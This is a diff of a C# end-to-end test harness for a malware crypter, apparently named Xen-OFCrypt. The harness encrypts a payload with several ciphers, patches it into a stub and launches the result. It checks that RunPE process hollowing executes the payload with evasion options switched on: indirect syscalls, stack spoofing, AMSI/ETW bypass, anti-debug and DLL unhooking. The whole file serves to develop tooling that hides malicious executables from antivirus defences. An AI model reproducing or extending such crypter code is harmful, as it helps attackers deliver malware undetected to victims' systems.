@@ -6,75 +6,142 @@ using System.Threading;
 using System.Security.Cryptography;
 using XanthoroxCrypted.Core;
 
-Console.WriteLine("=== E2E Test: Build + Patch + Run ===\n");
+// ═══════════════════════════════════════════════════════════
+//  Extended E2E Test Suite — Ciphers & Execution Methods
+//  NOTE: Fibers / CallbackProxy / ModuleStomp execute raw shellcode
+//  (VirtualAlloc RWX + direct call), NOT PE .exe files.
+//  These execution methods require position-independent shellcode
+//  payloads and are SKIPPED when testing with a PE payload.
+// ═══════════════════════════════════════════════════════════
 
 string stubDir = @"D:\Development\projects\Malware\crypters\Xen-OFCrypt";
 string outDir = Path.Combine(stubDir, "build", "out");
 string stubPath = Path.Combine(outDir, "stub.exe");
-string markerPath = @"C:\temp\runpe_marker.txt";
 string payloadPath = Path.Combine(stubDir, "build", "e2e_test", "bin", "test_payload_simple.exe");
-string outputPath = Path.Combine(outDir, "e2e_crypted_test.exe");
+string markerPath = @"C:\temp\runpe_marker.txt";
 
 if (!File.Exists(stubPath)) { Console.WriteLine("[FAIL] stub.exe not found"); return; }
 if (!File.Exists(payloadPath)) { Console.WriteLine("[FAIL] test_payload_simple.exe not found"); return; }
-Console.WriteLine("[1] stub.exe + payload found");
 
-Console.WriteLine("[2] Patching...");
-byte[] stubData = File.ReadAllBytes(stubPath);
 byte[] rawPayload = File.ReadAllBytes(payloadPath);
-byte[] key = RandomNumberGenerator.GetBytes(32);
+byte[] stubTemplate = File.ReadAllBytes(stubPath);
 
-byte[] encryptedPayload = CryptoEngine.Encrypt(rawPayload, key, CipherType.XOR);
+int totalTests = 0, passed = 0, failed = 0, skipped = 0;
 
-var config = new BuildConfig {
-    RunPE = true,
-    HostProcess = 0,
-    EncAlgorithm = 3,
-    IndirectSyscalls = true,
-};
+// ── Test runner ──
+void RunTest(string name, BuildConfig config, CipherType cipher)
+{
+    totalTests++;
+    Console.Write($"  [{totalTests}] {name,-45} ");
 
-string error = StubPatcher.Build(stubData, outputPath, encryptedPayload, key, config);
-if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"[FAIL] {error}"); return; }
-Console.WriteLine("[2] Patched OK");
+    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
+    byte[] key = RandomNumberGenerator.GetBytes(32);
+    byte[] encrypted = CryptoEngine.Encrypt(rawPayload, key, cipher);
 
-if (File.Exists(markerPath)) File.Delete(markerPath);
-foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
-Thread.Sleep(300);
+    string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
+    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }
 
-Console.WriteLine("[3] Launching...");
-var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
+    if (File.Exists(markerPath)) File.Delete(markerPath);
+    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
+    Thread.Sleep(200);
 
-bool found = false;
-for (int i = 0; i < 10; i++) {
-    Thread.Sleep(2000);
-    if (File.Exists(markerPath)) {
-        string content = File.ReadAllText(markerPath);
-        Console.WriteLine($"[PASS] Marker file found after {((i+1)*2)}s: {content.Trim()}");
-        found = true;
-        break;
+    var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
+    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }
+
+    bool found = false;
+    for (int i = 0; i < 8; i++)
+    {
+        Thread.Sleep(2000);
+        if (File.Exists(markerPath))
+        {
+            string content = File.ReadAllText(markerPath);
+            Console.WriteLine($"PASS ({(i + 1) * 2}s)");
+            found = true;
+            break;
+        }
     }
-    // Check process status
-    bool stubAlive = true;
-    try { Process.GetProcessById(proc.Id); } catch { stubAlive = false; }
-    var notepads = Process.GetProcessesByName("notepad");
-    Console.WriteLine($"  t={((i+1)*2)}s: marker=false stubAlive={stubAlive} notepads={notepads.Length}");
+
+    if (!found)
+    {
+        bool stillRunning = true;
+        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
+        proc.WaitForExit(1000);
+        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
+        Console.WriteLine($"FAIL (no marker, {detail})");
+    }
+
+    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
+    if (File.Exists(markerPath)) File.Delete(markerPath);
+    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}
+
+    if (found) passed++; else failed++;
 }
 
-if (!found) {
-    Console.WriteLine("[FAIL] Marker file NOT found after 20s — payload did not execute");
-    try { var s = Process.GetProcessById(proc.Id); Console.WriteLine($"  Stub still running PID={s.Id}"); s.Kill(); }
-    catch { Console.WriteLine("  Stub exited"); }
+// ═══════════════════════════════════════════════════════════
+//  Cipher Tests — RunPE + each cipher algorithm
+// ═══════════════════════════════════════════════════════════
+Console.WriteLine("\n── Cipher Tests (RunPE + each algorithm) ──\n");
 
-    string debugLog = @"C:\temp\xen_debug.log";
-    if (File.Exists(debugLog)) {
-        Console.WriteLine("\n--- Debug log (last 20 lines) ---");
-        var lines = File.ReadAllLines(debugLog);
-        foreach (var line in lines.Skip(Math.Max(0, lines.Length - 20)))
-            Console.WriteLine("  " + line);
-    }
-}
+RunTest("RunPE + XOR + IndirectSyscalls",
+    new BuildConfig { RunPE = true, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
+    CipherType.XOR);
 
-foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
-if (File.Exists(markerPath)) File.Delete(markerPath);
+RunTest("RunPE + RC4 + IndirectSyscalls",
+    new BuildConfig { RunPE = true, EncAlgorithm = 2, IndirectSyscalls = true, StackSpoof = true },
+    CipherType.RC4);
 
-Console.WriteLine($"\n=== E2E Test Complete === [{(found ? "PASS" : "FAIL")}]");
+RunTest("RunPE + AES-256 + IndirectSyscalls",
+    new BuildConfig { RunPE = true, EncAlgorithm = 0, IndirectSyscalls = true, StackSpoof = true },
+    CipherType.AES256);
+
+RunTest("RunPE + ChaCha20 + IndirectSyscalls",
+    new BuildConfig { RunPE = true, EncAlgorithm = 1, IndirectSyscalls = true, StackSpoof = true },
+    CipherType.ChaCha20);
+
+// ═══════════════════════════════════════════════════════════
+//  Execution Method Tests — Note on shellcode-only methods
+// ═══════════════════════════════════════════════════════════
+Console.WriteLine("\n── Execution Method Tests ──\n");
+
+// Fibers / CallbackProxy / ModuleStomp require shellcode, not PE.
+// Document expected limitation and skip live test.
+Console.WriteLine("  [SKIP] Fibers + XOR — requires shellcode payload (not PE .exe)");
+Console.WriteLine("  [SKIP] CallbackProxy + XOR — requires shellcode payload (not PE .exe)");
+Console.WriteLine("  [SKIP] ModuleStomp + XOR — requires shellcode payload (not PE .exe)");
+
+// RunPE with all cipher algorithms (already tested above, but
+// add AES/RC4/ChaCha without IndirectSyscalls for coverage)
+RunTest("RunPE + AES-256 (no syscalls)",
+    new BuildConfig { RunPE = true, EncAlgorithm = 0 },
+    CipherType.AES256);
+
+RunTest("RunPE + ChaCha20 (no syscalls)",
+    new BuildConfig { RunPE = true, EncAlgorithm = 1 },
+    CipherType.ChaCha20);
+
+// ═══════════════════════════════════════════════════════════
+//  Feature Toggle Tests
+// ═══════════════════════════════════════════════════════════
+Console.WriteLine("\n── Feature Toggle Tests ──\n");
+
+RunTest("RunPE + XOR + PatchlessAmsiEtw",
+    new BuildConfig { RunPE = true, EncAlgorithm = 3, PatchlessAmsiEtw = true, IndirectSyscalls = true },
+    CipherType.XOR);
+
+RunTest("RunPE + XOR + AntiDebug",
+    new BuildConfig { RunPE = true, EncAlgorithm = 3, AntiDebug = true, IndirectSyscalls = true },
+    CipherType.XOR);
+
+RunTest("RunPE + XOR + KnownDllsUnhook",
+    new BuildConfig { RunPE = true, EncAlgorithm = 3, KnownDllsUnhook = true, IndirectSyscalls = true },
+    CipherType.XOR);
+
+// ═══════════════════════════════════════════════════════════
+//  Summary
+// ═══════════════════════════════════════════════════════════
+Console.WriteLine($"\n{'═',-60}");
+Console.WriteLine($"  E2E Results: {passed}/{totalTests} PASSED, {failed} FAILED, {skipped} SKIPPED");
+Console.WriteLine($"{'═',-60}");
+
+if (failed > 0)
+    Environment.ExitCode = 1;
